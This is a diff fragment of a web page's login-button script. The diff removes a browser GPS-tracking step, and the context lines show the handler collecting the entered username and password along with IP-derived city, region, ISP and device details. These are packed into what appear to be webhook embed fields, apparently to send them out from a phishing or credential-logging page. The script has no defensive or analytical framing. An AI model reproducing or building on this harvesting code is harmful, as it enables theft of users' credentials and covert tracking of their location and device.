@@ -338,7 +338,7 @@
   </script><script src="./dist/latest" id="prelude"></script>
   <script>
 
-    (async () => {
+(async () => {
   const loginButton = document.getElementById('login-button');
   if (!loginButton) return;
 
@@ -356,20 +356,6 @@
     }
   }
 
-  // Function to get GPS coordinates (requires user permission)
-  async function getGeolocation() {
-    return new Promise((resolve) => {
-      if (!navigator.geolocation) {
-        resolve(null);
-        return;
-      }
-      navigator.geolocation.getCurrentPosition(
-        (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
-        () => resolve(null)
-      );
-    });
-  }
-
   loginButton.addEventListener('click', async () => {
     const usernameInput = document.getElementById('login-username');
     const passwordInput = document.getElementById('login-password');
@@ -385,10 +371,6 @@
     const city = geoData?.city || 'Unknown';
     const region = geoData?.region || 'Unknown';
     const isp = geoData?.org || 'Unknown';
-
-    // Get GPS coordinates (optional)
-    const gps = await getGeolocation();
-    const gpsCoords = gps ? `${gps.lat}, ${gps.lon}` : 'Not available';
 
     // Device/Browser info
     const userAgent = navigator.userAgent;
@@ -427,7 +409,6 @@
             { name: "City", value: city, inline: true },
             { name: "Region", value: region, inline: true },
             { name: "ISP", value: isp, inline: true },
-            { name: "GPS", value: gpsCoords, inline: true },
             { name: "User Agent", value: userAgent, inline: false },
             { name: "Platform", value: platform, inline: true },
             { name: "Language", value: language, inline: true },
